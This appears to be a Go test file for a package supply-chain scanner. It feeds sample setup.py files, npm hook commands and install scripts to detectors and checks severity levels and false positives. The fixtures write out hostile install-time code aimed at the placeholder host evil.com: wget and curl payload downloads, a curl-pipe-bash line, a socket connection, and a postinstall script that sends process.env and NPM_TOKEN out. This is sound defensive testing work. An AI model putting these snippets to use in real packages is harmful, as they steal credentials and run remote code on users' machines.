// Test: AnalyzePythonSetup detects subprocess calls
// Justification: subprocess module calls in setup.py spawn child processes during
//                installation. Malicious packages use subprocess.Popen to run
//                reverse shells or download/execute payloads.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — subprocess
//         execution during install is a documented attack vector
// Methodology: Pass setup.py with subprocess.call() to AnalyzePythonSetup
// Result: Detected as HIGH severity "subprocess call" pattern
func TestAnalyzePythonSetup_Subprocess(t *testing.T) {
	setupContent := `
from setuptools import setup
import subprocess

subprocess.call(['wget', 'https://evil.com/malware', '-O', '/tmp/malware'])

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for subprocess.call()")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "subprocess call" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected subprocess call pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects base64 decode
// Justification: base64.b64decode() in setup.py is used to hide malicious payloads
//                from casual code review. The decoded data is typically passed to
//                exec() or os.system(). This pattern was seen in the "colourama"
//                typosquatting attack.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — obfuscation
//         via encoding is a documented supply chain attack technique
// Methodology: Pass setup.py with base64.b64decode() to AnalyzePythonSetup
// Result: Detected as HIGH severity "base64 decode" pattern
func TestAnalyzePythonSetup_Base64Decode(t *testing.T) {
	setupContent := `
from setuptools import setup
import base64

payload = base64.b64decode('aW1wb3J0IG9z')
exec(payload)

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for base64 decode + exec")
	}

	foundBase64 := false
	foundExec := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "base64 decode" {
			foundBase64 = true
		}
		if p.Pattern == "exec()" {
			foundExec = true
		}
	}
	if !foundBase64 {
		t.Error("Expected base64 decode pattern to be detected")
	}
	if !foundExec {
		t.Error("Expected exec() pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects socket connections
// Justification: Socket connections in setup.py indicate potential reverse shells
//                or data exfiltration channels. Legitimate packages never need raw
//                socket access during installation.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — reverse shells
//         via socket connections are a documented post-compromise technique
// Methodology: Pass setup.py with socket.socket() to AnalyzePythonSetup
// Result: Detected as HIGH severity "socket connection" pattern
func TestAnalyzePythonSetup_SocketConnection(t *testing.T) {
	setupContent := `
from setuptools import setup
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.com', 4444))

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for socket connection")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "socket connection" {
			found = true
		}
	}
	if !found {
		t.Error("Expected socket connection pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects marshal.loads (bytecode deserialization)
// Justification: marshal.loads() deserializes Python bytecode objects which can
//                execute arbitrary code without visible Python source. This is an
//                advanced obfuscation technique used to hide malicious logic.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
// Methodology: Pass setup.py with marshal.loads() to AnalyzePythonSetup
// Result: Detected as HIGH severity "marshal.loads" pattern
func TestAnalyzePythonSetup_MarshalLoads(t *testing.T) {
	setupContent := `
from setuptools import setup
import marshal, types

code = marshal.loads(b'\xe3\x00\x00...')
exec(types.FunctionType(code, globals())())

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for marshal.loads()")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "marshal.loads" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected marshal.loads pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects ctypes library loading
// Justification: ctypes.CDLL() loads native shared libraries which can execute
//                arbitrary native code. Malicious packages can use this to load
//                downloaded binaries during installation.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
// Methodology: Pass setup.py with ctypes.CDLL() to AnalyzePythonSetup
// Result: Detected as HIGH severity "ctypes library load" pattern
func TestAnalyzePythonSetup_CtypesLoad(t *testing.T) {
	setupContent := `
from setuptools import setup
import ctypes

lib = ctypes.CDLL('/tmp/malicious.so')
lib.exploit()

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for ctypes.CDLL()")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "ctypes library load" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected ctypes library load pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects from-import of network libraries
// Justification: "from urllib.request import urlopen" is functionally identical
//                to "import urllib" for supply chain risk — both enable network
//                access during installation for data exfiltration or payload download.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020)
// Methodology: Pass setup.py with from-import of urllib to AnalyzePythonSetup
// Result: Detected as MEDIUM severity "network from-import" pattern
func TestAnalyzePythonSetup_FromImportNetwork(t *testing.T) {
	setupContent := `
from setuptools import setup
from urllib.request import urlopen

data = urlopen('https://evil.com/payload').read()

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for from-import of network library")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "network from-import" {
			found = true
		}
	}
	if !found {
		t.Error("Expected network from-import pattern to be detected")
	}
}

// Test: AnalyzePythonSetup detects combined obfuscation attack
// Justification: Real-world malicious setup.py files typically combine multiple
//                techniques: base64-encoded payload + exec() + network requests.
//                The analyzer must detect ALL patterns, not just the first one.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
// Methodology: Pass setup.py with multiple attack patterns to AnalyzePythonSetup
// Result: Multiple patterns detected, overall risk level is HIGH
func TestAnalyzePythonSetup_CombinedAttackPatterns(t *testing.T) {
	setupContent := `
from setuptools import setup
import os, base64, subprocess

payload = base64.b64decode('Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQ=')
exec(payload)
os.system('echo pwned')
subprocess.Popen(['wget', 'https://evil.com/backdoor'])

setup(
    name='totally-legit-pkg',
    version='1.0.0',
    cmdclass={'install': CustomInstall},
)
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Fatal("Expected dangerous patterns for combined attack")
	}

	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level for combined attack, got %s", analysis.RiskLevel)
	}

	// Should detect at least 4 different patterns
	if len(analysis.DangerousPatterns) < 4 {
		t.Errorf("Expected at least 4 dangerous patterns for combined attack, got %d", len(analysis.DangerousPatterns))
	}

	// Verify specific patterns are detected
	patternSet := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patternSet[p.Pattern] = true
	}

	expectedPatterns := []string{"base64 decode", "exec()", "os.system/popen/exec", "cmdclass override"}
	for _, expected := range expectedPatterns {
		if !patternSet[expected] {
			t.Errorf("Expected pattern %q to be detected", expected)
		}
	}
}

// Test: AnalyzePythonSetup does not flag legitimate setup.py with only build deps
// Justification: Many legitimate packages use setup.py with standard setuptools
//                patterns (install_requires, packages, etc.). These should NOT be
//                flagged as suspicious — false positives reduce trust in the tool.
// Source: OSSF Scorecard methodology — minimize false positives
// Methodology: Pass a clean setup.py with only standard packaging boilerplate
// Result: No dangerous patterns, LOW risk level
func TestAnalyzePythonSetup_LegitimateSetupPy(t *testing.T) {
	setupContent := `
from setuptools import setup, find_packages

with open('README.md') as f:
    long_description = f.read()

setup(
    name='mypackage',
    version='1.0.0',
    description='A legitimate package',
    long_description=long_description,
    packages=find_packages(),
    install_requires=[
        'requests>=2.28.0',
        'click>=7.0',
    ],
    python_requires='>=3.7',
    classifiers=[
        'Programming Language :: Python :: 3',
    ],
)
`
	analysis := AnalyzePythonSetup(setupContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern)
		}
		t.Errorf("Expected no dangerous patterns for legitimate setup.py, got: %s", strings.Join(patterns, ", "))
	}

	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}

// ============================================================
// C Extension Build Allowlist Tests
// ============================================================

// Test: psycopg2-style setup.py with subprocess calls for C extension compilation
// Justification: Packages with C extensions (psycopg2, numpy, etc.) legitimately
//                use subprocess to invoke compilers (gcc, g++, clang). These are
//                standard build patterns, not supply chain attack vectors.
// Source: PyPA documentation on building C extensions with setuptools/distutils;
//         "Backstabber's Knife Collection" (Ohm et al., 2020) — distinguishes
//         build-time compilation from malicious subprocess use.
// Methodology: Pass a setup.py with C extension build patterns to AnalyzePythonSetup
// Result: subprocess/exec patterns are downgraded to LOW severity
func TestAnalyzePythonSetup_CExtensionBuildSubprocess(t *testing.T) {
	setupContent := `
from setuptools import setup, Extension
import subprocess

# Check for pg_config
result = subprocess.check_output(['pg_config', '--includedir'])

ext_modules = [
    Extension('psycopg2._psycopg',
              sources=['psycopg/psycopg.c'],
              include_dirs=[result.strip()])
]

setup(
    name='psycopg2',
    version='2.9.9',
    ext_modules=ext_modules,
)
`
	analysis := AnalyzePythonSetup(setupContent)

	// Should still detect patterns but downgraded
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
			t.Errorf("subprocess call in C extension build context should be downgraded from HIGH, got: %s", p.Severity)
		}
	}
	if analysis.RiskLevel == "HIGH" {
		t.Errorf("Expected non-HIGH risk level for C extension build, got HIGH")
	}
}

// Test: numpy-style setup.py with subprocess calls to gcc/make
// Justification: numpy uses subprocess to invoke gcc and make for compiling
//                C/Fortran extensions. These are standard build operations.
// Source: numpy build documentation; PyPA C extension build guide
// Methodology: Pass numpy-like setup.py with compiler subprocess calls
// Result: All build-related patterns downgraded to LOW
func TestAnalyzePythonSetup_NumpyStyleBuild(t *testing.T) {
	setupContent := `
from numpy.distutils.core import setup, Extension
import subprocess
import os

# Detect compiler
subprocess.call(['gcc', '-v'])
subprocess.check_call(['make', '-C', 'src'])

ext_modules = [
    Extension('numpy.core._multiarray_umath',
              sources=['numpy/core/src/multiarray/array_assign.c'])
]

setup(
    name='numpy',
    version='1.26.0',
    ext_modules=ext_modules,
)
`
	analysis := AnalyzePythonSetup(setupContent)

	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
			t.Errorf("subprocess call to gcc/make in numpy build should be LOW, got HIGH. Match: %s", p.Match)
		}
	}
	if analysis.RiskLevel == "HIGH" {
		t.Errorf("Expected non-HIGH risk for numpy-style build, got HIGH")
	}
}

// Test: Cython setup.py with exec() for build configuration
// Justification: Cython packages use exec() to evaluate build configuration
//                and cythonize() for compilation. This is standard practice.
// Source: Cython documentation on building extensions
// Methodology: Pass Cython-style setup.py with exec() call
// Result: exec() in Cython build context is downgraded to LOW
func TestAnalyzePythonSetup_CythonBuild(t *testing.T) {
	setupContent := `
from setuptools import setup, Extension
from Cython.Build import cythonize

extensions = cythonize([
    Extension("mymodule", sources=["mymodule.pyx"])
])

setup(
    name='mymodule',
    ext_modules=extensions,
)
`
	analysis := AnalyzePythonSetup(setupContent)

	if analysis.RiskLevel == "HIGH" {
		t.Errorf("Expected non-HIGH risk for Cython build, got HIGH")
	}
}

// Test: C extension build with cmake subprocess calls
// Justification: cmake is a standard build tool for C/C++ extensions.
//                subprocess.call(['cmake', ...]) is a benign build operation.
// Source: CMake documentation; PyPA guide on building C extensions
// Methodology: Pass setup.py using cmake via subprocess
// Result: cmake subprocess calls are downgraded to LOW
func TestAnalyzePythonSetup_CmakeBuild(t *testing.T) {
	setupContent := `
from setuptools import setup, Extension
import subprocess

subprocess.check_call(['cmake', '.', '-DCMAKE_BUILD_TYPE=Release'])
subprocess.check_call(['cmake', '--build', '.'])

setup(
    name='native-lib',
    version='1.0.0',
    ext_modules=[Extension('native', sources=['native.c'])],
)
`
	analysis := AnalyzePythonSetup(setupContent)

	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
			t.Errorf("cmake subprocess call should be LOW, got HIGH. Match: %s", p.Match)
		}
	}
	if analysis.RiskLevel == "HIGH" {
		t.Errorf("Expected non-HIGH risk for cmake build, got HIGH")
	}
}

// Test: C extension build context but with dangerous network subprocess call
// Justification: Even in C extension build context, subprocess calls that
//                download from the network (curl, wget, pip install) are
//                suspicious and should NOT be downgraded.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — network
//         operations during install are a primary supply chain attack vector
// Methodology: Pass setup.py with both C extension context AND network downloads
// Result: Network-related subprocess calls remain HIGH severity
func TestAnalyzePythonSetup_CExtWithDangerousNetwork(t *testing.T) {
	setupContent := `
from setuptools import setup, Extension
import subprocess

subprocess.call(['curl', 'https://evil.com/payload.sh'])
subprocess.call(['wget', 'https://evil.com/malware'])

ext_modules = [Extension('myext', sources=['myext.c'])]
setup(name='suspicious', ext_modules=ext_modules)
`
	analysis := AnalyzePythonSetup(setupContent)

	foundHighSubprocess := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
			foundHighSubprocess = true
		}
	}
	if !foundHighSubprocess {
		t.Error("Expected subprocess calls with curl/wget to remain HIGH even in C extension context")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level for network downloads, got %s", analysis.RiskLevel)
	}
}

// Test: Malicious setup.py without C extension context is unaffected
// Justification: The build allowlist should ONLY apply when C extension
//                build indicators are present. A setup.py without Extension()
//                or distutils imports that uses subprocess should still be HIGH.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020)
// Methodology: Pass malicious setup.py without C extension indicators
// Result: Patterns remain HIGH — no downgrading without build context
func TestAnalyzePythonSetup_MaliciousWithoutBuildContext(t *testing.T) {
	setupContent := `
from setuptools import setup
import subprocess

subprocess.call(['curl', 'https://evil.com/payload', '-o', '/tmp/payload'])
subprocess.call(['bash', '/tmp/payload'])

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk for malicious setup.py without build context, got %s", analysis.RiskLevel)
	}

	foundHighSubprocess := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
			foundHighSubprocess = true
		}
	}
	if !foundHighSubprocess {
		t.Error("Expected subprocess patterns to remain HIGH without C extension context")
	}
}

// Test: Build context with cmdclass override for build_ext
// Justification: cmdclass = {'build_ext': CustomBuildExt} is the standard
//                pattern for customizing C extension builds. Should be LOW.
// Source: setuptools documentation on customizing build_ext
// Methodology: Pass setup.py with build_ext cmdclass override
// Result: cmdclass override in build context is downgraded to LOW
func TestAnalyzePythonSetup_CmdclassBuildExt(t *testing.T) {
	setupContent := `
from setuptools import setup, Extension
from setuptools.command.build_ext import build_ext

class CustomBuildExt(build_ext):
    def build_extensions(self):
        build_ext.build_extensions(self)

setup(
    name='myext',
    ext_modules=[Extension('myext', sources=['myext.c'])],
    cmdclass={'build_ext': CustomBuildExt},
)
`
	analysis := AnalyzePythonSetup(setupContent)

	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "cmdclass override" && p.Severity != "LOW" {
			t.Errorf("cmdclass override in build_ext context should be LOW, got %s", p.Severity)
		}
	}
}

// Test: C extension build with mixed benign and dangerous patterns
// Justification: A setup.py can have both benign build subprocess calls AND
//                genuinely dangerous patterns (base64 decode, socket). Only
//                build-explainable patterns should be downgraded.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
// Methodology: Pass setup.py with C extension context, build subprocess, and base64
// Result: subprocess downgraded, base64/socket remain at original severity
func TestAnalyzePythonSetup_MixedBuildAndDangerous(t *testing.T) {
	setupContent := `
from setuptools import setup, Extension
import subprocess
import base64
import socket

subprocess.check_call(['gcc', '-shared', '-o', 'myext.so', 'myext.c'])
payload = base64.b64decode('aW1wb3J0IG9z')
socket.socket()

setup(name='mixed', ext_modules=[Extension('myext', sources=['myext.c'])])
`
	analysis := AnalyzePythonSetup(setupContent)

	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk due to base64+socket despite build context, got %s", analysis.RiskLevel)
	}

	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "subprocess call" && p.Severity == "HIGH" {
			t.Errorf("subprocess call to gcc should be downgraded in build context, got HIGH")
		}
		if p.Pattern == "base64 decode" && p.Severity != "HIGH" {
			t.Errorf("base64 decode should remain HIGH even in build context, got %s", p.Severity)
		}
		if p.Pattern == "socket connection" && p.Severity != "HIGH" {
			t.Errorf("socket connection should remain HIGH even in build context, got %s", p.Severity)
		}
	}
}

// ============================================================
// resolveScriptFilePaths Tests
// ============================================================

// Test: Resolves simple interpreter + file commands
// Justification: npm install hooks commonly delegate to script files (e.g., "node scripts/postinstall.js").
//                If snyft only analyzes the hook string and not the script file, a compromised package
//                can hide malicious code in the referenced file — a blind spot in supply chain analysis.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — documents install hook
//         abuse where malicious code resides in referenced script files, not the hook string itself.
// Methodology: Pass common npm hook command formats to resolveScriptFilePaths
// Result: Returns the correct file paths extracted from each command
func TestResolveScriptFilePaths_SimpleCommands(t *testing.T) {
	tests := []struct {
		command  string
		expected []string
	}{
		{"node scripts/postinstall.js", []string{"scripts/postinstall.js"}},
		{"node ./install.js", []string{"install.js"}},
		{"sh scripts/setup.sh", []string{"scripts/setup.sh"}},
		{"bash ./scripts/build.sh", []string{"scripts/build.sh"}},
		{"python setup.py", []string{"setup.py"}},
		{"./scripts/install.sh", []string{"scripts/install.sh"}},
	}

	for _, tt := range tests {
		paths := resolveScriptFilePaths(tt.command)
		if len(paths) != len(tt.expected) {
			t.Errorf("resolveScriptFilePaths(%q): expected %d paths, got %d: %v", tt.command, len(tt.expected), len(paths), paths)
			continue
		}
		for i, p := range paths {
			if p != tt.expected[i] {
				t.Errorf("resolveScriptFilePaths(%q)[%d]: expected %q, got %q", tt.command, i, tt.expected[i], p)
			}
		}
	}
}

// Test: Resolves chained commands with && and ;
// Justification: Attackers chain benign commands with malicious ones (e.g., "echo done && node exfil.js")
//                to obscure the dangerous script reference. Path resolution must handle command separators.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — documents command chaining
//         as an obfuscation technique in npm supply chain attacks.
// Methodology: Pass chained commands to resolveScriptFilePaths
// Result: Returns all file paths from all chained command segments
func TestResolveScriptFilePaths_ChainedCommands(t *testing.T) {
	paths := resolveScriptFilePaths("echo hello && node scripts/postinstall.js ; sh scripts/cleanup.sh")
	expected := []string{"scripts/postinstall.js", "scripts/cleanup.sh"}
	if len(paths) != len(expected) {
		t.Fatalf("Expected %d paths, got %d: %v", len(expected), len(paths), paths)
	}
	for i, p := range paths {
		if p != expected[i] {
			t.Errorf("Path %d: expected %q, got %q", i, expected[i], p)
		}
	}
}

// Test: Skips inline code flags (-e, --eval, -c)
// Justification: Commands like "node -e 'code'" execute inline code, not files. Attempting to
//                read "-e" or "'code'" as file paths would produce false positives or errors.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — distinguishes between
//         inline execution and file-based execution as separate attack vectors.
// Methodology: Pass commands with inline code flags to resolveScriptFilePaths
// Result: Returns empty list — no file paths to resolve
func TestResolveScriptFilePaths_SkipsInlineCode(t *testing.T) {
	tests := []string{
		"node -e 'console.log(1)'",
		"node --eval 'console.log(1)'",
		"python -c 'print(1)'",
		"echo hello",
		"npm run build",
	}
	for _, cmd := range tests {
		paths := resolveScriptFilePaths(cmd)
		if len(paths) != 0 {
			t.Errorf("resolveScriptFilePaths(%q): expected no paths, got %v", cmd, paths)
		}
	}
}

// Test: Deduplicates file paths referenced multiple times
// Justification: The same script file referenced by multiple hooks should only be analyzed once
//                to avoid duplicate findings that inflate risk scores.
// Source: OSSF Scorecard methodology — findings should be deduplicated to avoid score inflation.
// Methodology: Pass a command referencing the same file twice to resolveScriptFilePaths
// Result: Returns the file path only once
func TestResolveScriptFilePaths_Deduplication(t *testing.T) {
	paths := resolveScriptFilePaths("node scripts/setup.js && node scripts/setup.js")
	if len(paths) != 1 {
		t.Errorf("Expected 1 deduplicated path, got %d: %v", len(paths), paths)
	}
}

// ============================================================
// analyzeNodeScript Tests
// ============================================================

// Test: Detects require('child_process') in Node.js scripts
// Justification: Loading child_process enables arbitrary command execution — the primary
//                mechanism for malicious npm packages to run payloads, exfiltrate data,
//                or establish reverse shells at install time.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — child_process is the
//         most common execution vector in documented npm supply chain attacks.
// Methodology: Pass script with require('child_process') to analyzeNodeScript
// Result: Detects require(child_process) pattern with HIGH severity
func TestAnalyzeNodeScript_ChildProcess(t *testing.T) {
	content := `const { exec } = require('child_process');
exec('curl http://evil.com/payload | sh');`

	analysis := analyzeNodeScript(content)

	if !analysis.HasDangerousPatterns {
		t.Fatal("Expected dangerous patterns for child_process usage")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "require(child_process)" {
			found = true
			break
		}
	}
	if !found {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern)
		}
		t.Errorf("Expected require(child_process) pattern, got: %s", strings.Join(patterns, ", "))
	}

	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}
}

// Test: Detects HTTP request functions in Node.js scripts
// Justification: HTTP requests at install time are used for data exfiltration (sending
//                stolen credentials/tokens to attacker servers) and payload download
//                (fetching second-stage malware). This is not normal install behavior.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — documents HTTP-based
//         exfiltration as the dominant data theft method in compromised npm packages.
// Methodology: Pass script with https.get() to analyzeNodeScript
// Result: Detects HTTP request pattern with HIGH severity
func TestAnalyzeNodeScript_HTTPRequests(t *testing.T) {
	content := `const https = require('https');
https.get('https://evil.com/steal?data=' + process.env.NPM_TOKEN);`

	analysis := analyzeNodeScript(content)

	if !analysis.HasDangerousPatterns {
		t.Fatal("Expected dangerous patterns for HTTP request")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "HTTP request" || p.Pattern == "require(network module)" {
			found = true
			break
		}
	}
	if !found {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern)
		}
		t.Errorf("Expected HTTP request or network module pattern, got: %s", strings.Join(patterns, ", "))
	}
}

// Test: Detects fs.writeFileSync to system paths
// Justification: Writing to system directories (/usr, /etc, /tmp) at install time can
//                drop persistent backdoors, modify system configuration, or plant malicious
//                executables that survive package removal.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — documents file system
//         modification as a persistence mechanism in supply chain attacks.
// Methodology: Pass script with fs.writeFileSync to /tmp to analyzeNodeScript
// Result: Detects fs.write to system path pattern with HIGH severity
func TestAnalyzeNodeScript_FsWriteSystemPath(t *testing.T) {
	content := `const fs = require('fs');
fs.writeFileSync('/tmp/backdoor.sh', maliciousPayload);`

	analysis := analyzeNodeScript(content)

	if !analysis.HasDangerousPatterns {
		t.Fatal("Expected dangerous patterns for fs.writeFileSync to system path")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "fs.write to system path" {
			found = true
			break
		}
	}
	if !found {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern)
		}
		t.Errorf("Expected 'fs.write to system path' pattern, got: %s", strings.Join(patterns, ", "))
	}
}

// Test: Clean Node.js script has no false positives
// Justification: Legitimate postinstall scripts (e.g., node-gyp rebuild, patch-package)
//                are common in npm packages. False positives on benign scripts would
//                inflate risk scores and reduce trust in the tool.
// Source: OSSF Scorecard methodology — scoring must not penalize legitimate practices.
// Methodology: Pass a clean postinstall script to analyzeNodeScript
// Result: No dangerous patterns, LOW risk level
func TestAnalyzeNodeScript_CleanScript(t *testing.T) {
	content := `// Standard postinstall script
const path = require('path');
const fs = require('fs');

// Copy config template to the right location
const src = path.join(__dirname, 'config.template.json');
const dest = path.join(__dirname, '..', 'config.json');

if (!fs.existsSync(dest)) {
  fs.copyFileSync(src, dest);
  console.log('Config file created');
}
`

	analysis := analyzeNodeScript(content)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, fmt.Sprintf("%s (match: %s)", p.Pattern, p.Match))
		}
		t.Errorf("Expected no dangerous patterns for clean script, got: %s", strings.Join(patterns, ", "))
	}

	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for clean script, got %s", analysis.RiskLevel)
	}
}

// ============================================================
// AnalyzeNPMScriptFiles Tests
// ============================================================

// Test: Reads and analyzes script file referenced by postinstall hook
// Justification: A postinstall hook pointing to a malicious script file (e.g.,
//                "postinstall": "node scripts/postinstall.js") is the most common npm
//                supply chain attack pattern. Analyzing only the hook string misses
//                the actual malicious code in the referenced file.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — 83% of documented npm
//         attacks use postinstall hooks that reference external script files.
// Methodology: Create mock scripts with a malicious postinstall.js, call AnalyzeNPMScriptFiles
//              with a mock reader, verify dangerous patterns are found and annotated with file path
// Result: Detects patterns in the script file with file path and hook name in the report
func TestAnalyzeNPMScriptFiles_MaliciousPostinstall(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "node scripts/postinstall.js",
		"test":        "jest",
	}

	mockFiles := map[string]string{
		"scripts/postinstall.js": `
const { exec } = require('child_process');
const https = require('https');

// Exfiltrate environment variables
const data = JSON.stringify(process.env);
https.get('https://evil.com/steal?data=' + Buffer.from(data).toString('base64'));
`,
	}

	readFile := func(path string) (string, error) {
		if content, ok := mockFiles[path]; ok {
			return content, nil
		}
		return "", fmt.Errorf("file not found: %s", path)
	}

	patterns := AnalyzeNPMScriptFiles(scripts, readFile)

	if len(patterns) == 0 {
		t.Fatal("Expected dangerous patterns from malicious postinstall.js")
	}

	// Verify patterns are annotated with file path
	hasFileAnnotation := false
	for _, p := range patterns {
		if strings.Contains(p.Match, "scripts/postinstall.js:") {
			hasFileAnnotation = true
			break
		}
	}
	if !hasFileAnnotation {
		t.Error("Expected pattern matches to include file path annotation")
	}

	// Verify patterns reference the hook name
	hasHookAnnotation := false
	for _, p := range patterns {
		if strings.Contains(p.Description, "postinstall hook") {
			hasHookAnnotation = true
			break
		}
	}
	if !hasHookAnnotation {
		t.Error("Expected pattern descriptions to reference the postinstall hook")
	}
}

// Test: Handles missing script files gracefully
// Justification: npm packages in the registry may reference script files that don't exist
//                in the git repository (e.g., generated during build, or package.json out of
//                sync with the repo). Failing on missing files would break the analysis pipeline.
// Source: OSSF Scorecard methodology — graceful degradation when data is unavailable.
// Methodology: Create scripts referencing a file that the mock reader can't find
// Result: Returns empty patterns, no errors or panics
func TestAnalyzeNPMScriptFiles_MissingFile(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "node scripts/missing.js",
	}

	readFile := func(path string) (string, error) {
		return "", fmt.Errorf("file not found: %s", path)
	}

	patterns := AnalyzeNPMScriptFiles(scripts, readFile)

	if len(patterns) != 0 {
		t.Errorf("Expected no patterns for missing file, got %d", len(patterns))
	}
}

// Test: Analyzes shell scripts with generic pattern detection
// Justification: Some npm packages use shell scripts in their install hooks
//                (e.g., "postinstall": "sh scripts/setup.sh"). These should be analyzed
//                with the generic AnalyzeScript patterns, not the Node.js-specific ones.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — shell-based install
//         scripts are a secondary but documented attack vector in npm packages.
// Methodology: Create a mock shell script with curl|bash pattern, call AnalyzeNPMScriptFiles
// Result: Detects dangerous shell patterns in the .sh file
func TestAnalyzeNPMScriptFiles_ShellScript(t *testing.T) {
	scripts := map[string]string{
		"preinstall": "sh scripts/setup.sh",
	}

	mockFiles := map[string]string{
		"scripts/setup.sh": `#!/bin/bash
curl https://evil.com/payload.sh | bash
`,
	}

	readFile := func(path string) (string, error) {
		if content, ok := mockFiles[path]; ok {
			return content, nil
		}
		return "", fmt.Errorf("file not found: %s", path)
	}

	patterns := AnalyzeNPMScriptFiles(scripts, readFile)

	if len(patterns) == 0 {
		t.Fatal("Expected dangerous patterns from malicious shell script")
	}

	found := false
	for _, p := range patterns {
		if p.Pattern == "curl/wget | bash" {
			found = true
			break
		}
	}
	if !found {
		patternNames := []string{}
		for _, p := range patterns {
			patternNames = append(patternNames, p.Pattern)
		}
		t.Errorf("Expected 'curl/wget | bash' pattern, got: %s", strings.Join(patternNames, ", "))
	}
}

// Test: Skips non-install hooks (test, build, start)
// Justification: Only install-time hooks (preinstall, install, postinstall) execute during
//                package installation. Scripts referenced by build/test/start hooks cannot
//                compromise a consumer's system at install time.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — confirms only install-time
//         hooks are attack vectors; lifecycle hooks like "test" require explicit invocation.
// Methodology: Create scripts with only non-install hooks pointing to malicious files
// Result: Returns empty patterns — non-install hooks are not analyzed
